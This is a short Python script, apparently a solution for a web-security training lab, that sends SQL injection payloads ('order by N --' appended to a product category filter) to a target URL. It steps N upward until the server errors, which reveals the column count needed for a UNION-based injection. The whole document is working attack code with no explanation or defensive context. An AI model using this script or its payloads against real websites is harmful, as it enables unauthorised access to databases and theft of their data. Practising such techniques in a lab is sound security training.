import requests
from bs4 import BeautifulSoup

def check_succes(soup):
    if 'Congratulations, you solved the lab!' in soup.text:
        return 'Exploit successful'
    return f'{soup.text} Something went wrong'

def parse_html(response):
    return BeautifulSoup(response.content,'html.parser')


def number_cols(url):
    for req in range(1,20):
        payload=f"filter?category=Lifestyle' order by {req} --"
        response=requests.get(f'{url}{payload}')
        soup=parse_html(response)
        print('fired up')
        if 'Internal Server Error' in soup.text:
            return req-1
        
    return 'Number cols undetermined'
